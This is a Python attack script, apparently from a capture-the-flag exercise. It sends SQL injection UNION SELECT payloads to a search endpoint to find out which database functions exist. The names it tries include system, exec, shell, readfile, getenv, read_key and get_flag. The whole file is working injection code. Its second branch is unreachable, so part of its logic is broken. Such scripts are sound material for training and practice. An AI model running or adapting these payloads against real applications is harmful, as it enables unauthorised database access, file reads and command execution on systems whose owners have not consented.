from client import GhostClient

c = GhostClient()
c.bootstrap()

func_names = [
    # standard / extension functions
    "readfile", "writefile", "file_read", "read_file", "load_file",
    "getenv", "env", "sys_eval", "system", "cmd", "exec", "execute",
    "shell", "passthru", "proc", "spawn",
    "encrypt", "decrypt", "hash", "md5", "sha1", "sha256",
    "jwt", "token", "verify", "sign", "auth",
    "key", "keys", "get_key", "load_key", "read_key",
    "config", "get_config", "setting", "get_setting",
    "log", "logs", "write_log", "add_log",
    "pcap", "capture", "traffic",
    "flag", "get_flag", "read_flag",
    "admin", "is_admin", "check_admin",
    "guest", "bootstrap", "session",
    "user", "get_user", "find_user",
    "query", "search", "lookup", "fetch",
    "http", "request", "curl", "get", "post",
    "sleep", "delay", "wait", "pause",
    "version", "info", "status", "health",
]

for name in func_names:
    q = f"' UNION SELECT 1, cast({name}() as text), 3--"
    res = c.request("search", {"q": q})
    err = res.get("error", "")
    if "no such function" not in err and "archive query rejected" not in err:
        print(f"FUNCTION EXISTS / INTERESTING: {name:20s} -> {res}")
    elif "wrong number of arguments" in err or "not authorized" in err:
        print(f"FUNCTION EXISTS (arg count): {name:20s} -> {err}")
